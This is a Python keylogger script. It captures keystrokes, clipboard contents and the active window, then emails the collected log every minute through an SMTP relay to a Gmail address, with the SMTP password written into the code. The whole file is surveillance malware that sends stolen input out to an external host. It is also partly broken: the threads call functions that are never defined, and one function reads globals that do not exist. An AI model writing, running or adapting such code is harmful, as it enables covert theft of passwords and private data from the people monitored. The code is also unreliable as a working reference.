import threading
import time
import subprocess
import platform
import smtplib
from pynput.keyboard import Listener
import pyperclip
from email.message import EmailMessage
import json


# Data storage
data_log = {
    "keystrokes": [],
    "clipboard": [],
    "active_window": []
}
last_clipboard = ""
last_window = None

# get the active window, but depends on the operating system since there are different ways of getting the forefront process on different os
def get_active_window():
    if platform.system() == "Windows":
        try:
            import win32gui
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())

        except Exception as e:
            return f"Error: {e}"

    elif platform.system() == "Darwin":  # macOS
        try:
            result = subprocess.run(
                ["osascript", "-e", 
                'tell application "System Events" to get name of (processes where frontmost is true)'],
                capture_output=True, text=True
                # the above line is how you get the current active window/process 
            )
            return result.stdout.strip()

        except Exception as e:
            return f"Error: {e}"

    return "Unsupported OS"

# Function to only log the active window when it changes
def log_active_window():
    global last_window
    active_window = get_active_window()

    if active_window != last_window:
        last_window = active_window
        data_log["active_window"].append({
            "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
            "window": active_window
        })

# get keystrokes
def on_press(key):
    try:
        data_log["keystrokes"].append(f"{key.char}") 

    except AttributeError:
        data_log["keystrokes"].append(f"{key}")

    log_active_window()

# get clipboard data
def log_clipboard():
    global last_clipboard
    try:
        clipboard_content = pyperclip.paste()
        if clipboard_content and clipboard_content != last_clipboard:
            data_log["clipboard"].append(clipboard_content)
            last_clipboard = clipboard_content
            log_active_window()
            
    except Exception as e:
        print(f"Clipboard logging error: {e}")

def send_email(log_data):
    #got information and code from https://mailtrap.io 
    sender_email = "hello@demomailtrap.com" 
    receiver_email = "geniusmyra@gmail.com"
    message = EmailMessage()
    message.set_content(log_data)

    message['Subject'] = 'Keylogger Data'
    message['From'] = sender_email
    message['To'] = receiver_email

    smtp_server = "live.smtp.mailtrap.io"
    smtp_port = 587
    smtp_username = "api"
    smtp_password = "135c408123864db529258d292639635a"

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(smtp_username, smtp_password)
            server.send_message(message)
            print("Email sent successfully!") #primarily for debugging purposes

    except Exception as e:
        print(f"Failed to send email: {e}") #primarily for debugging purposes

def get_data_in_json():

    global keystrokes, clipboard_data, active_window_info

    if not keystrokes and not clipboard_data and not active_window_info:
        print("No data to compile.")  # for debugging

    log_data = json.dumps({
        "keystrokes": keystrokes,
        "clipboard": clipboard_data,
        "active_windows": active_window_info,
        "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')
    }, indent=4)

    return log_data

# Monitoring clipboard changes
def clipboard_logging():
    while True:
        log_clipboard()
        time.sleep(10) # get clipboard data every 10 seconds

# Start keylogger 
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()


def email_sending_loop():

    while True:
        log_data = compile_log_data()
        if log_data:
            send_email(log_data) 
        time.sleep(60)  # send email every minute

#multi-threading

keylogger_thread = threading.Thread(target=start_keylogger)
clipboard_thread = threading.Thread(target=monitor_clipboard)
email_thread = threading.Thread(target=email_sending_loop)

keylogger_thread.start()
clipboard_thread.start()
email_thread.start()
